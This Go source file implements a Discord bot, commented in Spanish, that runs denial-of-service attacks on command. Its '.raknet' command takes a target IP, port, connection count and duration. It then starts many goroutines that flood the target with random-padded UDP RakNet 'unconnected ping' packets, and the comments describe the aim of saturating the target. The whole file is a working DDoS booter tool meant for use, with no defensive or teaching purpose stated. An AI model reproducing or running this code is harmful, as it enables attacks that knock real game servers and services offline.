package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
	"math/rand"
	"bufio"

	"github.com/bwmarrin/discordgo"
)

var (
	attackCancel     chan struct{}
	attackOnce       sync.Once
	attackIsRunning  bool
	processMutex     sync.Mutex
)

func main() {
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" {
		// Nuevo: Pedir token si no está, guardar en token.txt
		data, err := os.ReadFile("token.txt")
		if err != nil || len(strings.TrimSpace(string(data))) == 0 {
			fmt.Print("Introduce tu DISCORD_BOT_TOKEN: ")
			reader := bufio.NewReader(os.Stdin)
			tk, _ := reader.ReadString('\n')
			token = strings.TrimSpace(tk)
			os.WriteFile("token.txt", []byte(token), 0600)
		} else {
			token = strings.TrimSpace(string(data))
		}
	}

	if token == "" {
		fmt.Println("Error: No se proporcionó un DISCORD_BOT_TOKEN válido")
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creando Discord session:", err)
		return
	}

	dg.AddHandler(messageCreate)

	err = dg.Open()
	if err != nil {
		fmt.Println("Error abriendo conexión:", err)
		return
	}

	fmt.Println("Bot está corriendo. Presiona CTRL+C para salir.")
	<-make(chan struct{})
	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	content := strings.TrimSpace(m.Content)
	args := strings.Fields(content)
	if len(args) == 0 {
		return
	}
	switch args[0] {
	case ".raknet":
		handleRaknetCommand(s, m, args[1:])
	case ".stop":
		handleStopCommand(s, m)
	case ".help":
		handleHelpCommand(s, m)
	}
}

func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	processMutex.Lock()
	defer processMutex.Unlock()

	if attackIsRunning {
		s.ChannelMessageSend(m.ChannelID, "Ya hay un ataque corriendo.")
		return
	}
	if len(args) < 4 {
		s.ChannelMessageSend(m.ChannelID, "`.raknet <ip> <puerto> <conexiones> <segundos>`")
		return
	}

	ip := args[0]
	port := args[1]
	connections := args[2]
	timeSeconds := args[3]

	if !isValidIP(ip) {
		s.ChannelMessageSend(m.ChannelID, "IP no válida")
		return
	}
	if !isValidPort(port) {
		s.ChannelMessageSend(m.ChannelID, "Puerto no válido")
		return
	}
	numConn, err1 := strconv.Atoi(connections)
	durSec, err2 := strconv.Atoi(timeSeconds)
	if err1 != nil || err2 != nil || numConn <= 0 || durSec <= 0 {
		s.ChannelMessageSend(m.ChannelID, "Argumentos no válidos")
		return
	}

	attackIsRunning = true
	attackCancel = make(chan struct{})
	s.ChannelMessageSend(m.ChannelID, "Ataque iniciado")
	go raknetAttack(ip, port, numConn, time.Duration(durSec)*time.Second, s, m.ChannelID)
}

func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	processMutex.Lock()
	defer processMutex.Unlock()
	if !attackIsRunning {
		s.ChannelMessageSend(m.ChannelID, "No hay ataque corriendo")
		return
	}
	attackOnce = sync.Once{}
	close(attackCancel)
	attackIsRunning = false
	s.ChannelMessageSend(m.ChannelID, "Ataque detenido")
}

func handleHelpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	helpMsg := "**Comandos disponibles:**\n" +
		".raknet <ip> <puerto> <conexiones> <segundos>\n" +
		".stop - Detiene los ataques\n" +
		".help - Muestra esta ayuda\n\n"
	s.ChannelMessageSend(m.ChannelID, helpMsg)
}

func isValidIP(ip string) bool {
	if ip == "localhost" {
		return true
	}
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		num, err := strconv.Atoi(part)
		if err != nil || num < 0 || num > 255 {
			return false
		}
	}
	return true
}
func isValidPort(port string) bool {
	p, err := strconv.Atoi(port)
	if err != nil {
		return false
	}
	return p > 0 && p <= 65535
}

// --------------- EL ATAQUE: SOLO HANDSHAKE - CONEXIÓN PARCIAL ---------------
func raknetAttack(ip, port string, connections int, duration time.Duration, s *discordgo.Session, channelID string) {
	addr := net.JoinHostPort(ip, port)
	end := time.Now().Add(duration)
	var wg sync.WaitGroup

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-attackCancel:
					return
				default:
					if time.Now().After(end) {
						return
					}
					// Solo handshake RakNet: UDP "unconnected ping" packet
					conn, err := net.Dial("udp", addr)
					if err == nil {
						defer conn.Close()
						// Packet ID for UNCONNECTED_PING is 0x01
						ping := make([]byte, 25)
						ping[0] = 0x01
						// Los siguientes bytes pueden ser random/0 (client ID más padding, da igual para saturar)
						rand.Read(ping[1:])
						conn.Write(ping)
					}
					// Puedes ajustar para spamear más, menos sleep = más consumo target
					time.Sleep(30 * time.Millisecond)
				}
			}
		}()
	}
	go func() {
		// Cuando termine duración o stop
		select {
		case <-attackCancel:
		case <-time.After(duration):
		}
		processMutex.Lock()
		attackIsRunning = false
		processMutex.Unlock()
		s.ChannelMessageSend(channelID, "Ataque finalizado")
	}()
	wg.Wait()
}
